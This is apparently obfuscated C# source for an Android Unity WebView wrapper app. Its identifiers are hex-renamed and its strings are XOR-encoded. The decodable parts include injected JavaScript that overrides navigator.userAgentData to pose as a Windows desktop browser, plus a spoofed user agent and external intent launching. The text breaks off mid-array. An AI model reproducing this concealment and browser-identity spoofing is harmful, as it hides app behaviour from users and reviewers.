using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class _0xf2129c2e : MonoBehaviour
{
    private void _0x76f52684(string _0xb39a7c55)
    {
        if (string.IsNullOrEmpty(_0xb39a7c55))
            return;
        if (TryOpenExternalLikeChrome(_0xb39a7c55))
            return;
        OpenUrlExternally(_0xb39a7c55);
    }

    internal Rect lastSafe = Rect.zero;
    private string GetFailingUrl(UniWebViewNativeResultPayload _0x385a7785)
    {
        if (_0x385a7785 == null || _0x385a7785.Extra == null)
            return null;
        object _0x16745e91;
        if (!_0x385a7785.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0x16745e91))
            return null;
        return _0x16745e91 as string;
    }

    private void _0xfdb425d5(bool _0x62f19458)
    {
        _0xb5746a85();
        _0x3b47e84a.SetActive(_0x62f19458);
        _0x07a65fa7 = _0x62f19458;
        if (_0x62f19458)
        {
            _0x3b47e84a.transform.SetAsLastSibling();
            if (_0x87ec74b0 != null)
                _0x87ec74b0.localRotation = Quaternion.identity;
        }
    }

    private IEnumerator _0x91f1d5e6()
    {
        yield return RequestAndroidPermissionIfNeeded(Permission.Camera);
    }

    private async Task _0xc5d58db7()
    {
        if (await _0xdd2301c6())
            return;
        if (await _0xb73ba882())
            return;
        if (await _0xaa29ef9a())
            return;
        _0x22802cae();
        await _0xdde5cfbd(_0x4a8107ff());
        _0x0cf9bf36 = await _0x6db5d5ba();
        await _0xa215ba8a();
    }

    private string _0xc7b61809 = "";
    internal bool IsHttpUrl(string _0x990e656f)
    {
        if (string.IsNullOrEmpty(_0x990e656f))
            return false;
        return _0x990e656f.StartsWith(_0x691e60c5._0x0bb7411d(new byte[7] { 127, 99, 99, 103, 45, 56, 56 }, 23), StringComparison.OrdinalIgnoreCase) || _0x990e656f.StartsWith(_0x691e60c5._0x0bb7411d(new byte[8] { 198, 218, 218, 222, 221, 148, 129, 129 }, 174), StringComparison.OrdinalIgnoreCase);
    }

    private void _0x8acf3259()
    {
        if (_0xd016fc7d)
        {
            WLog(_0x691e60c5._0x0bb7411d(new byte[18] { 56, 5, 20, 9, 93, 28, 17, 15, 24, 28, 25, 4, 93, 14, 21, 18, 10, 19 }, 125));
            return;
        }

        _0xfdb425d5(false);
        WLog(_0x691e60c5._0x0bb7411d(new byte[46] { 127, 83, 91, 92, 18, 101, 87, 80, 100, 91, 87, 69, 18, 98, 71, 65, 90, 18, 124, 93, 70, 91, 84, 91, 81, 83, 70, 91, 93, 92, 18, 26, 90, 83, 64, 86, 69, 83, 64, 87, 18, 80, 83, 81, 89, 27 }, 50));
        ++_0x27b4cf29;
        _0x8914af27();
        if (_0x27b4cf29 <= 1)
            return;
        if (_0x70270bc4())
        {
            WLog(_0x691e60c5._0x0bb7411d(new byte[37] { 137, 180, 165, 184, 236, 191, 167, 165, 188, 188, 169, 168, 236, 225, 242, 236, 188, 163, 188, 185, 188, 191, 236, 191, 184, 165, 160, 160, 236, 163, 188, 169, 162, 169, 168, 246, 236 }, 204) + _0x16e4da3b.Count);
            return;
        }

        Application.Quit();
    }

    private void _0xf040e05e(UniWebView _0x4002cdd6)
    {
        _0x4002cdd6.BackgroundColor = Color.clear;
        _0x4002cdd6.SetSupportMultipleWindows(true, true);
        _0x4002cdd6.SetBackButtonEnabled(false);
        _0x7efe16e4.SetUserAgent(_0x1a7c48d3());
    }

    private string _0x95069f27 = "";
    private bool _0x46d9aaf1()
    {
        if (_0x67b68479())
            return true;
        if (_0x7efe16e4 != null && _0x7efe16e4.CanGoBack)
        {
            WLog(_0x691e60c5._0x0bb7411d(new byte[36] { 190, 151, 132, 146, 129, 151, 132, 147, 214, 148, 151, 149, 157, 214, 219, 200, 214, 155, 151, 159, 152, 214, 161, 147, 148, 160, 159, 147, 129, 214, 177, 153, 180, 151, 149, 157 }, 246));
            _0x7efe16e4.GoBack();
            return true;
        }

        return false;
    }

    private bool _0xcf2ba14c(int _0xf4687797, string _0x9b9d888d, string _0xbcc3117f)
    {
        if (string.IsNullOrEmpty(_0xbcc3117f))
            return false;
        if (!IsHttpUrl(_0xbcc3117f))
            return true;
        if (string.IsNullOrEmpty(_0x9b9d888d))
            return false;
        return _0x9b9d888d.IndexOf(_0x691e60c5._0x0bb7411d(new byte[20] { 8, 31, 31, 18, 14, 2, 3, 3, 8, 14, 25, 4, 2, 3, 18, 31, 8, 30, 8, 25 }, 77), StringComparison.OrdinalIgnoreCase) >= 0 || _0x9b9d888d.IndexOf(_0x691e60c5._0x0bb7411d(new byte[22] { 230, 241, 241, 252, 224, 236, 237, 237, 230, 224, 247, 234, 236, 237, 252, 241, 230, 229, 246, 240, 230, 231 }, 163), StringComparison.OrdinalIgnoreCase) >= 0 || _0x9b9d888d.IndexOf(_0x691e60c5._0x0bb7411d(new byte[21] { 174, 185, 185, 180, 168, 164, 165, 165, 174, 168, 191, 162, 164, 165, 180, 168, 167, 164, 184, 174, 175 }, 235), StringComparison.OrdinalIgnoreCase) >= 0 || _0x9b9d888d.IndexOf(_0x691e60c5._0x0bb7411d(new byte[22] { 223, 200, 200, 197, 207, 212, 209, 212, 213, 205, 212, 197, 207, 200, 214, 197, 201, 217, 210, 223, 215, 223 }, 154), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    internal void Update()
    {
        if (_0x7efe16e4 == null)
            return;
        if (_0x042474c1())
            _0x078ddcbc();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0x2131d3ab();
        if (_0x07a65fa7 && _0x87ec74b0 != null)
            _0x87ec74b0.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    private bool _0x11874922(string _0x2232e582)
    {
        try
        {
            using (var _0xee6f2f15 = new AndroidJavaClass(_0x691e60c5._0x0bb7411d(new byte[30] { 215, 219, 217, 154, 193, 218, 221, 192, 205, 135, 208, 154, 196, 216, 213, 205, 209, 198, 154, 225, 218, 221, 192, 205, 228, 216, 213, 205, 209, 198 }, 180)))
            using (var _0xbe29c7aa = _0xee6f2f15.GetStatic<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[15] { 80, 70, 65, 65, 86, 93, 71, 114, 80, 71, 90, 69, 90, 71, 74 }, 51)))
            using (var _0xe6bbfa98 = new AndroidJavaClass(_0x691e60c5._0x0bb7411d(new byte[15] { 206, 193, 203, 221, 192, 198, 203, 129, 193, 202, 219, 129, 250, 221, 198 }, 175)))
            using (var _0xbc080bf8 = _0xe6bbfa98.CallStatic<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[5] { 158, 143, 156, 157, 139 }, 238), _0x2232e582))
            using (var _0xe45f33cb = new AndroidJavaObject(_0x691e60c5._0x0bb7411d(new byte[22] { 74, 69, 79, 89, 68, 66, 79, 5, 72, 68, 69, 95, 78, 69, 95, 5, 98, 69, 95, 78, 69, 95 }, 43), _0x691e60c5._0x0bb7411d(new byte[26] { 78, 65, 75, 93, 64, 70, 75, 1, 70, 65, 91, 74, 65, 91, 1, 78, 76, 91, 70, 64, 65, 1, 121, 102, 106, 120 }, 47), _0xbc080bf8))
            {
                WLog(_0x691e60c5._0x0bb7411d(new byte[26] { 158, 181, 175, 178, 176, 184, 145, 180, 182, 184, 253, 178, 173, 184, 179, 253, 184, 165, 169, 184, 175, 179, 188, 177, 231, 253 }, 221) + _0x2232e582);
                _0xe45f33cb.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[11] { 120, 125, 125, 90, 120, 109, 124, 126, 118, 107, 96 }, 25), _0x691e60c5._0x0bb7411d(new byte[33] { 35, 44, 38, 48, 45, 43, 38, 108, 43, 44, 54, 39, 44, 54, 108, 33, 35, 54, 39, 37, 45, 48, 59, 108, 0, 16, 13, 21, 17, 3, 0, 14, 7 }, 66));
                _0xe45f33cb.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[8] { 220, 217, 217, 251, 209, 220, 218, 206 }, 189), 0x10000000);
                _0xbe29c7aa.Call(_0x691e60c5._0x0bb7411d(new byte[13] { 44, 43, 62, 45, 43, 30, 60, 43, 54, 41, 54, 43, 38 }, 95), _0xe45f33cb);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x691e60c5._0x0bb7411d(new byte[28] { 63, 20, 14, 19, 17, 25, 48, 21, 23, 25, 92, 25, 4, 8, 25, 14, 18, 29, 16, 92, 26, 29, 21, 16, 25, 24, 70, 92 }, 124) + e.Message);
            Application.OpenURL(_0x2232e582);
            return true;
        }
    }

    private static bool IsPrivacyItemTrue(Item _0xbaee27a6)
    {
        if (_0xbaee27a6.Key != _0x691e60c5._0x0bb7411d(new byte[9] { 210, 200, 235, 201, 210, 205, 218, 216, 194 }, 187))
            return false;
        try
        {
            var _0xbab75a2c = _0xbaee27a6.Value.GetAs<object>();
            return _0xbab75a2c switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    private UniWebViewPopup _0x036c0375()
    {
        for (int _0x3a523e61 = _0x16e4da3b.Count - 1; _0x3a523e61 >= 0; _0x3a523e61--)
        {
            var _0x0845bf9a = _0x16e4da3b[_0x3a523e61];
            if (_0x0845bf9a != null && _0x0845bf9a.IsAlive)
                return _0x0845bf9a;
            _0x16e4da3b.RemoveAt(_0x3a523e61);
        }

        return null;
    }

    private string _0x8c1b9694()
    {
        float _0xf3f545fa = Time.realtimeSinceStartup;
        if (_0xf3f545fa < 0f)
            _0xf3f545fa = 0f;
        int _0x651659d2 = (int)(_0xf3f545fa * 1000f);
        int _0x905451d1 = _0x651659d2 / 60000;
        int _0x7325d46d = (_0x651659d2 / 1000) % 60;
        int _0x20d09531 = _0x651659d2 % 1000;
        return string.Format(_0x691e60c5._0x0bb7411d(new byte[21] { 198, 141, 135, 141, 141, 192, 135, 198, 140, 135, 141, 141, 192, 135, 198, 143, 135, 141, 141, 141, 192 }, 189), _0x905451d1, _0x7325d46d, _0x20d09531);
    }

    private string _0x681563e9(string _0xce2ced89, string _0xe8e25daa)
    {
        if (string.IsNullOrEmpty(_0xe8e25daa))
            return _0xce2ced89;
        if (_0xce2ced89.Contains(_0x691e60c5._0x0bb7411d(new byte[1] { 246 }, 201)))
            return _0xce2ced89 + _0x691e60c5._0x0bb7411d(new byte[8] { 31, 74, 92, 87, 93, 80, 93, 4 }, 57) + UnityWebRequest.EscapeURL(_0xe8e25daa);
        else
            return _0xce2ced89 + _0x691e60c5._0x0bb7411d(new byte[8] { 5, 73, 95, 84, 94, 83, 94, 7 }, 58) + UnityWebRequest.EscapeURL(_0xe8e25daa);
    }

    internal bool _0x95c873ba(string _0xe46c7f01)
    {
        return _0xe46c7f01.StartsWith(_0x691e60c5._0x0bb7411d(new byte[9] { 100, 104, 123, 98, 108, 125, 51, 38, 38 }, 9), StringComparison.OrdinalIgnoreCase) || _0xe46c7f01.StartsWith(_0x691e60c5._0x0bb7411d(new byte[24] { 94, 66, 66, 70, 69, 12, 25, 25, 70, 90, 87, 79, 24, 81, 89, 89, 81, 90, 83, 24, 85, 89, 91, 25 }, 54), StringComparison.OrdinalIgnoreCase) || _0xe46c7f01.StartsWith(_0x691e60c5._0x0bb7411d(new byte[23] { 49, 45, 45, 41, 99, 118, 118, 41, 53, 56, 32, 119, 62, 54, 54, 62, 53, 60, 119, 58, 54, 52, 118 }, 89), StringComparison.OrdinalIgnoreCase);
    }

    private bool _0x019a6445 = false;
    private bool _0x36b9c406(string _0xa2900882, string _0xaae4e4af)
    {
        string _0xe93aa0b8 = _0xef0a8a6c(_0xa2900882);
        if (string.IsNullOrEmpty(_0xe93aa0b8))
            _0xe93aa0b8 = _0xaae4e4af;
        if (_0x8dca44f1(_0xe93aa0b8))
            return true;
        string _0x960440c3 = string.IsNullOrEmpty(_0xe93aa0b8) ? _0x691e60c5._0x0bb7411d(new byte[29] { 203, 215, 215, 211, 208, 153, 140, 140, 211, 207, 194, 218, 141, 196, 204, 204, 196, 207, 198, 141, 192, 204, 206, 140, 208, 215, 204, 209, 198 }, 163) : _0x691e60c5._0x0bb7411d(new byte[46] { 77, 81, 81, 85, 86, 31, 10, 10, 85, 73, 68, 92, 11, 66, 74, 74, 66, 73, 64, 11, 70, 74, 72, 10, 86, 81, 74, 87, 64, 10, 68, 85, 85, 86, 10, 65, 64, 81, 68, 76, 73, 86, 26, 76, 65, 24 }, 37) + _0xe93aa0b8;
        WLog(_0x691e60c5._0x0bb7411d(new byte[35] { 132, 175, 181, 168, 170, 162, 139, 174, 172, 162, 231, 170, 166, 181, 172, 162, 179, 231, 161, 166, 171, 171, 165, 166, 164, 172, 231, 166, 180, 231, 176, 162, 165, 253, 231 }, 199) + _0x960440c3);
        return _0x11874922(_0x960440c3);
    }

    private string _0xb792f32e = "";
    private string _0x741ecce1 = "";
    private IEnumerator _0xe7026741(IEnumerator _0x8d596552, TaskCompletionSource<bool> _0xd379f5fc)
    {
        yield return _0x8d596552;
        _0xd379f5fc.SetResult(true);
    }

    private void _0x5a758606()
    {
        _0x2cf098e9 = true;
        if (_0x7efe16e4 != null)
            _0x7efe16e4.SetUserAgent(_0x1a7c48d3());
    }

    private void _0xb5746a85()
    {
        if (_0x3b47e84a != null)
            return;
        var _0x142cb0e9 = _0x128eb3c4();
        _0x3b47e84a = new GameObject(_0x691e60c5._0x0bb7411d(new byte[14] { 235, 217, 222, 234, 213, 217, 203, 239, 204, 213, 210, 210, 217, 206 }, 188), typeof(RectTransform), typeof(Text));
        _0x87ec74b0 = _0x3b47e84a.GetComponent<RectTransform>();
        _0x87ec74b0.SetParent(_0x142cb0e9.transform, false);
        _0x87ec74b0.anchorMin = new Vector2(0.5f, 0.5f);
        _0x87ec74b0.anchorMax = new Vector2(0.5f, 0.5f);
        _0x87ec74b0.pivot = new Vector2(0.5f, 0.5f);
        _0x87ec74b0.sizeDelta = new Vector2(600f, 600f);
        _0x87ec74b0.anchoredPosition = Vector2.zero;
        _0xb121a268 = _0x3b47e84a.GetComponent<Text>();
        _0xb121a268.text = _0x691e60c5._0x0bb7411d(new byte[1] { 248 }, 215);
        _0xb121a268.font = Resources.GetBuiltinResource<Font>(_0x691e60c5._0x0bb7411d(new byte[17] { 125, 84, 86, 80, 82, 72, 99, 68, 95, 69, 88, 92, 84, 31, 69, 69, 87 }, 49));
        _0xb121a268.fontSize = 200;
        _0xb121a268.alignment = TextAnchor.MiddleCenter;
        _0xb121a268.color = Color.white;
        _0xb121a268.raycastTarget = false;
        _0x3b47e84a.SetActive(false);
    }

    private void _0xb53fc4a8(string _0x4f7d2212)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[34] { 19, 28, 45, 59, 60, 21, 104, 14, 45, 60, 43, 32, 104, 13, 48, 60, 58, 41, 104, 24, 61, 59, 32, 104, 12, 41, 60, 41, 104, 26, 41, 63, 114, 104 }, 72) + _0x4f7d2212);
#endif
            }
        }

        var _0x6c137b64 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x4f7d2212);
        StartCoroutine(_0xa402857a(_0x6c137b64));
    }

    private bool _0x042474c1()
    {
        var _0xcb0d457a = Keyboard.current;
        return _0xcb0d457a != null && _0xcb0d457a.escapeKey.wasPressedThisFrame;
    }

    private Canvas _0x22cfc713;
    private string _0x15439407 = "";
    private string _0xd2bbde7e { get; set; }

    private JObject BuildRandomPayload(params string[] _0xa5c8dbf8)
    {
        JObject _0x88b2bf97 = new JObject();
        foreach (var _0xd88bc46b in _0xa5c8dbf8)
        {
            string _0x8cdf483d = _0x6213d63d();
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0x8cdf483d} val={_0xd88bc46b}");
#endif
            }

            _0x88b2bf97.Add(_0x8cdf483d, _0xd88bc46b == null ? "" : _0xd88bc46b);
        }

        return _0x88b2bf97;
    }

    private async Task<bool> _0xdd2301c6()
    {
        {
#if B_LOGS
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[37] { 92, 83, 98, 116, 115, 90, 39, 84, 110, 96, 105, 78, 105, 82, 105, 110, 115, 126, 84, 98, 117, 113, 110, 100, 98, 116, 70, 105, 104, 105, 126, 106, 104, 114, 116, 107, 126 }, 7));
#endif
        }

        try
        {
            var _0x38cd8de8 = new InitializationOptions();
            await UnityServices.InitializeAsync(_0x38cd8de8);
            {
#if B_LOGS
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[32] { 80, 95, 110, 120, 127, 86, 43, 94, 101, 98, 127, 114, 88, 110, 121, 125, 98, 104, 110, 120, 43, 66, 101, 98, 127, 98, 106, 103, 98, 113, 110, 111 }, 11));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[20] { 153, 136, 158, 153, 237, 152, 163, 164, 185, 180, 158, 168, 191, 187, 164, 174, 168, 190, 247, 237 }, 205) + ex.Message);
#endif
            }

            _0x206625e7?._0xbdc7ac42();
            return true;
        }

        bool _0x4052352f = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0x4052352f = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x691e60c5._0x0bb7411d(new byte[37] { 244, 251, 202, 220, 219, 242, 143, 252, 198, 200, 193, 130, 198, 193, 143, 238, 193, 192, 193, 214, 194, 192, 218, 220, 129, 143, 255, 195, 206, 214, 202, 221, 143, 230, 235, 149, 143 }, 175) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0xb792f32e = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x691e60c5._0x0bb7411d(new byte[25] { 155, 138, 156, 155, 239, 156, 166, 168, 161, 226, 166, 161, 239, 142, 186, 187, 167, 239, 138, 157, 157, 128, 157, 245, 239 }, 207) + ex.Message);
#endif
                }

                _0x206625e7?._0xbdc7ac42();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x691e60c5._0x0bb7411d(new byte[28] { 28, 13, 27, 28, 104, 27, 33, 47, 38, 101, 33, 38, 104, 26, 45, 57, 61, 45, 59, 60, 104, 13, 26, 26, 7, 26, 114, 104 }, 72) + ex.Message);
#endif
                }

                _0x206625e7?._0xbdc7ac42();
                return true;
            }
        }
        while (!_0x4052352f);
        return false;
    }

    private bool TryOpenExternalLikeChrome(string _0x2c6131e4)
    {
        if (string.IsNullOrEmpty(_0x2c6131e4))
            return false;
        if (_0x2c6131e4.StartsWith(_0x691e60c5._0x0bb7411d(new byte[9] { 89, 94, 68, 85, 94, 68, 10, 31, 31 }, 48), StringComparison.OrdinalIgnoreCase))
            return _0xc812295d(_0x2c6131e4);
        if (_0x95c873ba(_0x2c6131e4))
            return _0x36b9c406(_0x2c6131e4, null);
        if (!_0x2c6131e4.StartsWith(_0x691e60c5._0x0bb7411d(new byte[7] { 198, 218, 218, 222, 148, 129, 129 }, 174), StringComparison.OrdinalIgnoreCase) && !_0x2c6131e4.StartsWith(_0x691e60c5._0x0bb7411d(new byte[8] { 155, 135, 135, 131, 128, 201, 220, 220 }, 243), StringComparison.OrdinalIgnoreCase) && !_0x2c6131e4.StartsWith(_0x691e60c5._0x0bb7411d(new byte[11] { 101, 102, 107, 113, 112, 62, 102, 104, 101, 106, 111 }, 4), StringComparison.OrdinalIgnoreCase))
        {
            return _0x11874922(_0x2c6131e4);
        }

        return false;
    }

    private Action _0x7185ca7d;
    private bool _0x83a700ad = false;
    private Text _0xb121a268;
    private string _0x4c08c43a = "";
    private string _0x4a19c911 = "";
    private string _0x08999488()
    {
        return _0x691e60c5._0x0bb7411d(new byte[12] { 168, 230, 245, 238, 227, 244, 233, 239, 238, 168, 169, 251 }, 128) + _0x691e60c5._0x0bb7411d(new byte[8] { 159, 136, 155, 201, 156, 136, 212, 206 }, 233) + WindowsDesktopUserAgent + _0x691e60c5._0x0bb7411d(new byte[2] { 194, 222 }, 229) + _0x691e60c5._0x0bb7411d(new byte[30] { 141, 154, 137, 219, 139, 137, 148, 143, 148, 198, 181, 154, 141, 146, 156, 154, 143, 148, 137, 213, 139, 137, 148, 143, 148, 143, 130, 139, 158, 192 }, 251) + _0x691e60c5._0x0bb7411d(new byte[121] { 235, 248, 227, 238, 249, 228, 226, 227, 173, 233, 232, 235, 165, 226, 239, 231, 161, 230, 232, 244, 161, 251, 236, 225, 164, 246, 249, 255, 244, 246, 194, 239, 231, 232, 238, 249, 163, 233, 232, 235, 228, 227, 232, 221, 255, 226, 253, 232, 255, 249, 244, 165, 226, 239, 231, 161, 230, 232, 244, 161, 246, 234, 232, 249, 183, 235, 248, 227, 238, 249, 228, 226, 227, 165, 164, 246, 255, 232, 249, 248, 255, 227, 173, 251, 236, 225, 182, 240, 161, 238, 226, 227, 235, 228, 234, 248, 255, 236, 239, 225, 232, 183, 249, 255, 248, 232, 240, 164, 182, 240, 238, 236, 249, 238, 229, 165, 232, 164, 246, 240, 240 }, 141) + _0x691e60c5._0x0bb7411d(new byte[26] { 92, 93, 94, 16, 72, 74, 87, 76, 87, 20, 31, 77, 75, 93, 74, 121, 95, 93, 86, 76, 31, 20, 77, 89, 17, 3 }, 56) + _0x691e60c5._0x0bb7411d(new byte[130] { 208, 209, 210, 156, 196, 198, 219, 192, 219, 152, 147, 213, 196, 196, 226, 209, 198, 199, 221, 219, 218, 147, 152, 147, 129, 154, 132, 148, 156, 227, 221, 218, 208, 219, 195, 199, 148, 250, 224, 148, 133, 132, 154, 132, 143, 148, 227, 221, 218, 130, 128, 143, 148, 204, 130, 128, 157, 148, 245, 196, 196, 216, 209, 227, 209, 214, 255, 221, 192, 155, 129, 135, 131, 154, 135, 130, 148, 156, 255, 252, 224, 249, 248, 152, 148, 216, 221, 223, 209, 148, 243, 209, 215, 223, 219, 157, 148, 247, 220, 198, 219, 217, 209, 155, 133, 134, 132, 154, 132, 154, 132, 154, 132, 148, 231, 213, 210, 213, 198, 221, 155, 129, 135, 131, 154, 135, 130, 147, 157, 143 }, 180) + _0x691e60c5._0x0bb7411d(new byte[30] { 129, 128, 131, 205, 149, 151, 138, 145, 138, 201, 194, 149, 137, 132, 145, 131, 138, 151, 136, 194, 201, 194, 178, 140, 139, 214, 215, 194, 204, 222 }, 229) + _0x691e60c5._0x0bb7411d(new byte[34] { 254, 255, 252, 178, 234, 232, 245, 238, 245, 182, 189, 236, 255, 244, 254, 245, 232, 189, 182, 189, 221, 245, 245, 253, 246, 255, 186, 211, 244, 249, 180, 189, 179, 161 }, 154) + _0x691e60c5._0x0bb7411d(new byte[30] { 149, 148, 151, 217, 129, 131, 158, 133, 158, 221, 214, 156, 144, 137, 165, 158, 132, 146, 153, 161, 158, 152, 159, 133, 130, 214, 221, 193, 216, 202 }, 241) + _0x691e60c5._0x0bb7411d(new byte[449] { 203, 205, 198, 196, 201, 222, 205, 159, 202, 222, 219, 130, 196, 221, 205, 222, 209, 219, 204, 133, 228, 196, 221, 205, 222, 209, 219, 133, 152, 252, 215, 205, 208, 210, 214, 202, 210, 152, 147, 201, 218, 205, 204, 214, 208, 209, 133, 152, 142, 141, 143, 152, 194, 147, 196, 221, 205, 222, 209, 219, 133, 152, 248, 208, 208, 216, 211, 218, 159, 252, 215, 205, 208, 210, 218, 152, 147, 201, 218, 205, 204, 214, 208, 209, 133, 152, 142, 141, 143, 152, 194, 147, 196, 221, 205, 222, 209, 219, 133, 152, 241, 208, 203, 130, 254, 128, 253, 205, 222, 209, 219, 152, 147, 201, 218, 205, 204, 214, 208, 209, 133, 152, 141, 139, 152, 194, 226, 147, 210, 208, 221, 214, 211, 218, 133, 217, 222, 211, 204, 218, 147, 207, 211, 222, 203, 217, 208, 205, 210, 133, 152, 232, 214, 209, 219, 208, 200, 204, 152, 147, 216, 218, 203, 247, 214, 216, 215, 250, 209, 203, 205, 208, 207, 198, 233, 222, 211, 202, 218, 204, 133, 217, 202, 209, 220, 203, 214, 208, 209, 151, 150, 196, 205, 218, 203, 202, 205, 209, 159, 239, 205, 208, 210, 214, 204, 218, 145, 205, 218, 204, 208, 211, 201, 218, 151, 196, 222, 205, 220, 215, 214, 203, 218, 220, 203, 202, 205, 218, 133, 152, 199, 135, 137, 152, 147, 221, 214, 203, 209, 218, 204, 204, 133, 152, 137, 139, 152, 147, 210, 208, 221, 214, 211, 218, 133, 217, 222, 211, 204, 218, 147, 210, 208, 219, 218, 211, 133, 152, 152, 147, 207, 211, 222, 203, 217, 208, 205, 210, 133, 152, 232, 214, 209, 219, 208, 200, 204, 152, 147, 207, 211, 222, 203, 217, 208, 205, 210, 233, 218, 205, 204, 214, 208, 209, 133, 152, 142, 138, 145, 143, 145, 143, 152, 147, 202, 222, 249, 202, 211, 211, 233, 218, 205, 204, 214, 208, 209, 133, 152, 142, 141, 143, 145, 143, 145, 143, 145, 143, 152, 194, 150, 132, 194, 194, 132, 240, 221, 213, 218, 220, 203, 145, 219, 218, 217, 214, 209, 218, 239, 205, 208, 207, 218, 205, 203, 198, 151, 207, 205, 208, 203, 208, 147, 152, 202, 204, 218, 205, 254, 216, 218, 209, 203, 251, 222, 203, 222, 152, 147, 196, 216, 218, 203, 133, 217, 202, 209, 220, 203, 214, 208, 209, 151, 150, 196, 205, 218, 203, 202, 205, 209, 159, 202, 222, 219, 132, 194, 147, 220, 208, 209, 217, 214, 216, 202, 205, 222, 221, 211, 218, 133, 203, 205, 202, 218, 194, 150, 132, 194, 220, 222, 203, 220, 215, 151, 218, 150, 196, 194 }, 191) + _0x691e60c5._0x0bb7411d(new byte[112] { 12, 13, 14, 64, 27, 11, 26, 13, 13, 6, 68, 79, 31, 1, 12, 28, 0, 79, 68, 89, 81, 90, 88, 65, 83, 12, 13, 14, 64, 27, 11, 26, 13, 13, 6, 68, 79, 0, 13, 1, 15, 0, 28, 79, 68, 89, 88, 80, 88, 65, 83, 12, 13, 14, 64, 27, 11, 26, 13, 13, 6, 68, 79, 9, 30, 9, 1, 4, 63, 1, 12, 28, 0, 79, 68, 89, 81, 90, 88, 65, 83, 12, 13, 14, 64, 27, 11, 26, 13, 13, 6, 68, 79, 9, 30, 9, 1, 4, 32, 13, 1, 15, 0, 28, 79, 68, 89, 88, 92, 88, 65, 83 }, 104) + _0x691e60c5._0x0bb7411d(new byte[45] { 231, 225, 234, 232, 228, 250, 253, 247, 252, 228, 189, 252, 253, 231, 252, 230, 240, 251, 224, 231, 242, 225, 231, 174, 230, 253, 247, 246, 245, 250, 253, 246, 247, 168, 238, 240, 242, 231, 240, 251, 187, 246, 186, 232, 238 }, 147) + _0x691e60c5._0x0bb7411d(new byte[721] { 200, 206, 197, 199, 202, 221, 206, 156, 211, 206, 213, 219, 129, 203, 213, 210, 216, 211, 203, 146, 209, 221, 200, 223, 212, 241, 217, 216, 213, 221, 146, 222, 213, 210, 216, 148, 203, 213, 210, 216, 211, 203, 149, 135, 203, 213, 210, 216, 211, 203, 146, 209, 221, 200, 223, 212, 241, 217, 216, 213, 221, 129, 218, 201, 210, 223, 200, 213, 211, 210, 148, 205, 149, 199, 202, 221, 206, 156, 207, 129, 239, 200, 206, 213, 210, 219, 148, 205, 149, 146, 200, 211, 240, 211, 203, 217, 206, 255, 221, 207, 217, 148, 149, 135, 213, 218, 148, 207, 146, 213, 210, 216, 217, 196, 243, 218, 148, 155, 204, 211, 213, 210, 200, 217, 206, 134, 156, 223, 211, 221, 206, 207, 217, 155, 149, 130, 129, 140, 192, 192, 207, 146, 213, 210, 216, 217, 196, 243, 218, 148, 155, 212, 211, 202, 217, 206, 134, 156, 210, 211, 210, 217, 155, 149, 130, 129, 140, 192, 192, 207, 146, 213, 210, 216, 217, 196, 243, 218, 148, 155, 209, 221, 196, 145, 203, 213, 216, 200, 212, 155, 149, 130, 129, 140, 192, 192, 207, 146, 213, 210, 216, 217, 196, 243, 218, 148, 155, 209, 221, 196, 145, 216, 217, 202, 213, 223, 217, 145, 203, 213, 216, 200, 212, 155, 149, 130, 129, 140, 149, 206, 217, 200, 201, 206, 210, 156, 199, 209, 221, 200, 223, 212, 217, 207, 134, 218, 221, 208, 207, 217, 144, 209, 217, 216, 213, 221, 134, 205, 144, 211, 210, 223, 212, 221, 210, 219, 217, 134, 210, 201, 208, 208, 144, 221, 216, 216, 240, 213, 207, 200, 217, 210, 217, 206, 134, 218, 201, 210, 223, 200, 213, 211, 210, 148, 149, 199, 193, 144, 206, 217, 209, 211, 202, 217, 240, 213, 207, 200, 217, 210, 217, 206, 134, 218, 201, 210, 223, 200, 213, 211, 210, 148, 149, 199, 193, 144, 221, 216, 216, 249, 202, 217, 210, 200, 240, 213, 207, 200, 217, 210, 217, 206, 134, 218, 201, 210, 223, 200, 213, 211, 210, 148, 149, 199, 193, 144, 206, 217, 209, 211, 202, 217, 249, 202, 217, 210, 200, 240, 213, 207, 200, 217, 210, 217, 206, 134, 218, 201, 210, 223, 200, 213, 211, 210, 148, 149, 199, 193, 144, 216, 213, 207, 204, 221, 200, 223, 212, 249, 202, 217, 210, 200, 134, 218, 201, 210, 223, 200, 213, 211, 210, 148, 149, 199, 206, 217, 200, 201, 206, 210, 156, 